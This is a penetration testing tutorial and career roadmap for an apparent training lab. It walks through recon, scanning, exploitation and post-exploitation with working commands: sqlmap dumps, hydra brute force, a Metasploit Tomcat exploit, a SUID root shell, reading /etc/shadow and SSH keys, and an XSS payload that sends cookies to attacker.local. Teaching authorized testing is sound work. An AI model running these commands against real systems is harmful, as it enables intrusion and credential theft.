# Ethical Hacking — Methodology Flow & Skill Roadmap

---

## Phase Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        ETHICAL HACKING LIFECYCLE                            │
└─────────────────────────────────────────────────────────────────────────────┘

         ┌──────────────────────────────────────┐
         │  PHASE 0 — PLANNING & AUTHORIZATION  │
         │  • Get written permission (scope)    │
         │  • Define rules of engagement        │
         │  • Set time window & IP ranges       │
         └──────────────────┬───────────────────┘
                            │
                            ▼
         ┌──────────────────────────────────────┐
         │  PHASE 1 — RECONNAISSANCE            │
         │           (Passive & Active)         │
         │                                      │
         │  Passive (no direct contact):        │
         │  • WHOIS lookup                      │
         │  • Google dorking                    │
         │  • LinkedIn / social media OSINT     │
         │  • Shodan / Censys searches          │
         │  • DNS records (public)              │
         │                                      │
         │  Active (direct contact):            │
         │  • DNS zone transfer (AXFR)          │
         │  • Ping sweep                        │
         │  • Traceroute                        │
         └──────────────────┬───────────────────┘
                            │
                            ▼
         ┌──────────────────────────────────────┐
         │  PHASE 2 — SCANNING & ENUMERATION    │
         │                                      │
         │  Scanning:                           │
         │  • Port scan (which ports are open)  │
         │  • OS fingerprinting                 │
         │  • Service version detection         │
         │                                      │
         │  Enumeration:                        │
         │  • Pull banner/version strings       │
         │  • List users, shares, directories   │
         │  • Enumerate DNS subdomains          │
         │  • Enumerate web endpoints           │
         │  • SNMP / SMB / LDAP enumeration     │
         └──────────────────┬───────────────────┘
                            │
                            ▼
         ┌──────────────────────────────────────┐
         │  PHASE 3 — VULNERABILITY ANALYSIS    │
         │                                      │
         │  • Match services to known CVEs      │
         │  • Run automated scanners            │
         │  • Manual code / config review       │
         │  • Check for misconfigurations       │
         │  • Prioritize by exploitability      │
         └──────────────────┬───────────────────┘
                            │
                            ▼
         ┌──────────────────────────────────────┐
         │  PHASE 4 — EXPLOITATION              │
         │                                      │
         │  • Attempt to trigger the vuln       │
         │  • Gain initial foothold / shell     │
         │  • Bypass authentication             │
         │  • Inject payloads (SQLi, XSS, etc.) │
         │  • Use public exploits / Metasploit  │
         └──────────────────┬───────────────────┘
                            │
                            ▼
         ┌──────────────────────────────────────┐
         │  PHASE 5 — POST-EXPLOITATION         │
         │                                      │
         │  • Privilege escalation (user→root)  │
         │  • Lateral movement to other hosts   │
         │  • Data exfiltration (proof only)    │
         │  • Persistence techniques (demo)     │
         │  • Pivoting through network          │
         └──────────────────┬───────────────────┘
                            │
                            ▼
         ┌──────────────────────────────────────┐
         │  PHASE 6 — REPORTING                 │
         │                                      │
         │  • Document every step taken         │
         │  • Severity rating per finding       │
         │  • Proof-of-concept screenshots      │
         │  • Clear remediation recommendations │
         │  • Executive summary + technical doc │
         └──────────────────────────────────────┘
```

---

## Phase-by-Phase Breakdown with Real Examples

### Phase 0 — Planning & Authorization

Before touching anything you must have written authorization. Without it, every technique below is illegal.

**Example:**
```
Scope document excerpt:
  Target:   10.0.0.0/24, innovatetech.local
  Excluded: 10.0.0.1 (production router — do not touch)
  Window:   2026-06-14 02:00 – 06:00 UTC
  Tester:   John Doe, Cert #PT-2024-0042
```

---

### Phase 1 — Reconnaissance

**Goal:** Collect as much information as possible before touching the target.

#### 1a. Passive — WHOIS

```bash
whois innovatetech.com
```

**What you learn:** Registrar, registration date, name servers, registrant contact.

#### 1b. Passive — Google Dorking

```
site:innovatetech.com filetype:pdf
site:innovatetech.com inurl:admin
"innovatetech.com" "internal use only"
```

**What you learn:** Exposed files, admin panels, accidentally indexed internal pages.

#### 1c. Passive — DNS Public Records

```bash
# Find mail servers
host -t MX innovatetech.com

# Find all DNS records
dig ANY innovatetech.com @8.8.8.8
```

#### 1d. Active — DNS Zone Transfer (AXFR)

> This lab uses `innovatetech.local` on port 5454.

```bash
dig AXFR innovatetech.local @127.0.0.1 -p 5454
```

**What you learn (example output):**
```
mail.innovatetech.local     A  10.0.0.5
dev.innovatetech.local      A  10.0.0.20
internal.innovatetech.local A  10.0.0.99
db-backup.innovatetech.local A 10.0.0.77
```

You now have an internal network map the company didn't intend to expose.

#### 1e. Active — Ping Sweep

```bash
nmap -sn 10.0.0.0/24
```

**What you learn:** Which hosts are alive (respond to ICMP/ARP).

---

### Phase 2 — Scanning & Enumeration

**Goal:** Determine exactly what is running on each live host.

#### 2a. Port Scanning

```bash
# Fast scan — top 1000 ports
nmap -sV 10.0.0.5

# Full port scan
nmap -sV -p- 10.0.0.5

# UDP scan (slower but finds DNS, SNMP, TFTP)
nmap -sU -p 53,161 10.0.0.5
```

**Example output:**
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4
80/tcp   open  http     Apache httpd 2.4.6
3306/tcp open  mysql    MySQL 5.7.30
8080/tcp open  http     Tomcat 9.0.35
```

#### 2b. Web Directory Enumeration

```bash
# Brute-force hidden directories
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt

# Or with ffuf
ffuf -u http://10.0.0.5/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

**Example finds:**
```
/admin          (Status: 302)
/backup         (Status: 200)
/api/v1/users   (Status: 200)
/.git           (Status: 200)   ← source code leak!
```

#### 2c. DNS Subdomain Enumeration

```bash
# Brute-force subdomains
gobuster dns -d innovatetech.local -w /usr/share/wordlists/subdomains-top1million.txt

# Or amass
amass enum -d innovatetech.local
```

#### 2d. FTP Enumeration

```bash
ftp 10.0.0.5
# Try: anonymous / anonymous

nmap --script ftp-anon 10.0.0.5
```

**Example finds:** Anonymous login enabled → world-readable `/pub` directory with config files.

#### 2e. SSH Banner Grabbing

```bash
nc 10.0.0.5 22
# Returns: SSH-2.0-OpenSSH_7.4
```

Older versions have known CVEs — note the exact version.

---

### Phase 3 — Vulnerability Analysis

**Goal:** Map discovered services to known weaknesses.

#### 3a. Automated Scanner

```bash
# Nikto — web server scanner
nikto -h http://10.0.0.5

# Nuclei — template-based scanner
nuclei -u http://10.0.0.5 -t cves/
```

**Example Nikto output:**
```
+ Apache/2.4.6 appears to be outdated (CVE-2017-7679)
+ /phpmyadmin/ — phpMyAdmin found (default creds?)
+ X-Frame-Options header missing
+ Cookie set without HttpOnly flag
```

#### 3b. CVE Lookup

```bash
# Search for MySQL 5.7.30 exploits
searchsploit mysql 5.7

# Or check online
# https://nvd.nist.gov/vuln/search  (do not open in lab)
```

#### 3c. Manual Config Review

Check for:
- Default credentials (admin/admin, root/root)
- Debug mode enabled in production
- Error messages leaking stack traces
- API endpoints returning more data than needed

---

### Phase 4 — Exploitation

**Goal:** Prove the vulnerability is real by achieving a defined impact.

#### 4a. SQL Injection

```bash
# Manual test — does the page error?
curl "http://10.0.0.5/api/users?id=1'"

# Automated extraction with sqlmap
sqlmap -u "http://10.0.0.5/api/users?id=1" --dbs
sqlmap -u "http://10.0.0.5/api/users?id=1" -D appdb --tables
sqlmap -u "http://10.0.0.5/api/users?id=1" -D appdb -T users --dump
```

**Example result:**
```
[*] Fetched users table:
id | username | password_hash
1  | admin    | 5f4dcc3b5aa...  ← "password" in MD5
2  | alice    | 482c811da5d...
```

#### 4b. Brute Force SSH

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5
```

#### 4c. Exploit a Known CVE via Metasploit

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 10.0.0.5
set RPORT 8080
set HttpUsername tomcat
set HttpPassword tomcat
run
```

**Result:** Meterpreter shell on the Tomcat server.

#### 4d. Cross-Site Scripting (XSS)

```javascript
// Test payload in a search field
<script>alert(document.cookie)</script>

// Cookie-stealing payload
<script>fetch('http://attacker.local/steal?c='+document.cookie)</script>
```

---

### Phase 5 — Post-Exploitation

**Goal:** Demonstrate impact — how far can an attacker go from the initial foothold?

#### 5a. Privilege Escalation

```bash
# Check who you are
whoami && id

# Find SUID binaries (run as owner regardless of caller)
find / -perm -4000 2>/dev/null

# Check sudo rights
sudo -l

# Kernel exploit check
uname -r
searchsploit linux kernel 4.15
```

**Example:** SUID `/usr/bin/find` → instant root:
```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

#### 5b. Lateral Movement

```bash
# With root access, read SSH keys
cat /root/.ssh/id_rsa

# Use that key to hop to the next host
ssh -i stolen_key root@10.0.0.99
```

#### 5c. Data Exfiltration (proof of access)

```bash
# Grab the flag or sensitive file as proof
cat /root/flag.txt
cat /etc/shadow
```

---

### Phase 6 — Reporting

Every finding needs:

```
Title:       Unauthenticated SQL Injection in /api/users
Severity:    Critical (CVSS 9.8)
Location:    http://10.0.0.5/api/users?id=
Impact:      Full database dump, authentication bypass
Steps:
  1. Navigate to /api/users?id=1'
  2. Observe 500 error with MySQL error in response
  3. Run: sqlmap -u "http://10.0.0.5/api/users?id=1" --dbs
  4. Extracted 312 user records including password hashes
Evidence:    [screenshot] [sqlmap output log]
Fix:         Use parameterized queries / prepared statements
             Never concatenate user input into SQL strings
```

---

## Quick Reference — Tools per Phase

| Phase              | Tools                                           |
|--------------------|-------------------------------------------------|
| Reconnaissance     | whois, dig, nmap, theHarvester, Shodan, amass   |
| Scanning           | nmap, masscan, netcat                           |
| Web Enumeration    | gobuster, ffuf, dirb, whatweb, wappalyzer       |
| Vuln Analysis      | nikto, nuclei, searchsploit, nessus, openvas    |
| Exploitation       | sqlmap, hydra, metasploit, burpsuite            |
| Post-Exploitation  | linpeas, winpeas, mimikatz, bloodhound          |
| Reporting          | dradis, ghostwriter, faraday, plain markdown    |

---

---

# Skill Roadmap — Getting into Ethical Hacking

```
BEGINNER ──────────────────────────────────────────────────────► ADVANCED
    │                    │                    │                    │
 Foundation          Core Skills         Specialization        Expert
    │                    │                    │                    │
    ▼                    ▼                    ▼                    ▼
```

---

## Level 1 — Foundation (0–3 months)

These are non-negotiable before touching any hacking tool.

### Networking Basics

| Topic                  | What to Know                                        |
|------------------------|-----------------------------------------------------|
| OSI Model              | All 7 layers and what happens at each               |
| TCP/IP                 | How packets travel, TCP handshake (SYN/SYN-ACK/ACK) |
| IP Addressing          | IPv4/IPv6, subnetting, CIDR notation (/24, /16)     |
| Common Ports           | 21 FTP, 22 SSH, 53 DNS, 80 HTTP, 443 HTTPS, 3306 MySQL |
| DNS                    | A, MX, NS, CNAME records — how resolution works     |
| Protocols              | HTTP/S, FTP, SSH, SMTP, SNMP, SMB                  |

**Practice:** Packet Tracer, Wireshark on your own traffic.

### Linux Command Line

```bash
# Must be fluent in:
ls, cd, cat, grep, find, chmod, chown, ps, netstat/ss
pipes (|), redirection (>, >>), background jobs (&)
file permissions (rwx), users/groups, sudo
bash scripting basics (loops, conditionals, variables)
```

**Practice:** OverTheWire: Bandit (free, browser-based).

### Programming / Scripting (pick one to start)

| Language | Why It Matters in Hacking             |
|----------|----------------------------------------|
| Python   | Writing exploits, automating recon, parsing output |
| Bash     | Chaining tools, writing quick scripts  |
| JavaScript | Understanding XSS, web app logic     |
| SQL      | Understanding and exploiting injection |

**Goal:** Be able to read an exploit script and understand what every line does.

---

## Level 2 — Core Skills (3–9 months)

### Web Application Security

```
Learn the OWASP Top 10:
  1.  Broken Access Control
  2.  Cryptographic Failures
  3.  Injection (SQL, command, LDAP)
  4.  Insecure Design
  5.  Security Misconfiguration
  6.  Vulnerable & Outdated Components
  7.  Identification & Auth Failures
  8.  Software & Data Integrity Failures
  9.  Security Logging Failures
  10. Server-Side Request Forgery (SSRF)
```

**Tool to master:** Burp Suite (intercept, repeat, intruder, scanner)

**Practice platforms:**
- DVWA (Damn Vulnerable Web Application)
- HackTheBox — Starting Point machines
- TryHackMe — Web Fundamentals path
- This lab you're working in right now

### Network Penetration Testing

- nmap scan types: `-sS` (SYN), `-sU` (UDP), `-sV` (version), `-A` (aggressive)
- Understand what each nmap flag actually does — don't just memorize commands
- Read packet captures in Wireshark
- Understand firewall/IDS evasion concepts

### Cryptography Basics

| Concept         | Why It Matters                                 |
|-----------------|------------------------------------------------|
| Hashing         | MD5/SHA — cracking password dumps              |
| Symmetric enc.  | AES — recognizing encrypted data               |
| Asymmetric enc. | RSA/ECC — SSH keys, TLS certificates           |
| Base64/hex      | Decoding obfuscated payloads                   |
| JWT tokens      | Common web auth mechanism — often misconfigured |

```bash
# Crack MD5 hash from a database dump
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
john --format=raw-md5 hash.txt --wordlist=rockyou.txt
```

---

## Level 3 — Specialization (9–18 months)

Choose a lane. Trying to master everything at once leads to mastering nothing.

```
┌─────────────────────────────────────────────────────────┐
│                   SPECIALIZATION TRACKS                  │
├────────────────┬───────────────────┬────────────────────┤
│  Web / AppSec  │  Network / Infra  │  Reverse Eng / PWN │
│                │                   │                    │
│  Burp Suite    │  Metasploit       │  Ghidra / IDA      │
│  SQLmap        │  Impacket         │  GDB / pwndbg      │
│  XSS / CSRF    │  BloodHound (AD)  │  Buffer overflows  │
│  API testing   │  Lateral movement │  Format strings    │
│  OAuth flaws   │  Kerberoasting    │  ROP chains        │
│                │  PtH / PtT        │  CTF pwn challs    │
└────────────────┴───────────────────┴────────────────────┘
```

---

## Level 4 — Expert Concepts (18+ months)

| Topic                      | Description                                        |
|----------------------------|----------------------------------------------------|
| Active Directory Attacks   | Kerberoasting, Pass-the-Hash, DCSync, Golden Ticket |
| Buffer Overflow             | Overwrite return address, control execution flow   |
| Shellcode Writing          | Writing raw assembly payloads                      |
| C2 Frameworks              | Cobalt Strike, Sliver, Havoc (authorized engagements only) |
| Cloud Pentesting           | AWS/GCP/Azure misconfigs, IAM privilege escalation |
| Mobile Pentesting          | APK analysis, MitM on mobile apps                  |
| Red Team Operations        | Full kill chain simulation, evasion, persistence   |

---

## Certifications — Ordered by Entry Point

```
Entry Level
  │
  ├─ CompTIA Security+       General security knowledge
  ├─ eJPT (eLearnSecurity)   First practical pentesting cert
  │
Intermediate
  │
  ├─ CEH                     Broad coverage, theory-heavy
  ├─ CompTIA PenTest+        Structured pentest methodology
  ├─ PNPT (TCM Security)     Practical, well-respected, affordable
  │
Advanced
  │
  ├─ OSCP (OffSec)           Gold standard — 24hr practical exam
  ├─ CRTE / CRTO             Active Directory / Red Team focus
  │
Expert
  │
  └─ OSED / OSMR / OSEP      Exploit dev, macOS, evasion
```

---

## Recommended Learning Order

```
Week 1–4   Linux basics          → OverTheWire: Bandit
Week 5–8   Networking            → Professor Messer / TryHackMe
Week 9–12  Python scripting      → Automate the Boring Stuff (free online)
Week 13–20 Web app hacking       → DVWA + TryHackMe Web path
Week 21–30 CTF practice          → HackTheBox Starting Point
Week 31–40 Network pentesting    → TryHackMe / this lab
Week 41+   Pick specialization   → PNPT or OSCP prep
```

---

## Mindset Rules

1. **Understand, don't memorize commands** — tools change, concepts don't.
2. **Read the manual** — `man nmap`, `nmap --help`, tool documentation.
3. **Break your own stuff first** — set up VMs, intentionally exploit them.
4. **Document everything** — notes, screenshots, command history.
5. **Stay legal** — always have written authorization. No exceptions.
6. **Contribute back** — write CTF writeups, blog what you learn.

---

*This guide maps directly to the InnovateTech Security Lab — every phase above has corresponding challenges in the lab environment.*
